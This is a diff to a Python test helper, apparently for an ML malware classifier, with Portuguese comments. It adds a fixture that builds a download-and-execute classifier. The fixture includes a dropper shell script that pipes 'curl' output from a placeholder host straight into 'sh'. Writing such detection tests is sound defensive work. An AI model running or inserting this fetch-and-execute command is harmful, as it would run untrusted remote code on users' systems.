@@ -29,3 +29,18 @@ def model_dict(*, family="elf", kinds=None, trees=None, base_score=0.0) -> dict:
         "metrics": {},
         "data_manifest_sha256": "0" * 64,
     }
+
+
+DROPPER = b"#!/bin/sh\ncurl -s http://exemplo.invalid/x | sh\n"
+
+
+def script_classifier(mode="isolate", valor=2.6):
+    """Modelo "script" so com o tipo "sh": a nota sobe quando ha baixa_e_executa (valor=2.6 da ~0.93)."""
+    import json
+
+    from mandacaru.ml import Classifier
+    from mandacaru.ml.model import parse_model
+
+    i = SCRIPT_FEATURE_NAMES.index("baixa_e_executa")
+    d = model_dict(family="script", kinds={"sh": dict(POLICY)}, trees=[stump(i, 0.5, -5.0, valor)])
+    return Classifier({"script": parse_model(json.dumps(d).encode())}, mode)
